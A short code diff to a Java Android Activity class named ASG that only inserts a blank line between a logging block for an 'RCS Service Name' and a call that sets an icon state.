@@ -154,6 +154,7 @@ public class ASG extends Activity {
 						Check.log(TAG + " RCS Service Name: " + cn.flattenToShortString());//$NON-NLS-1$
 					}
 				}
+
 				Status.setIconState(true);
 			}
 
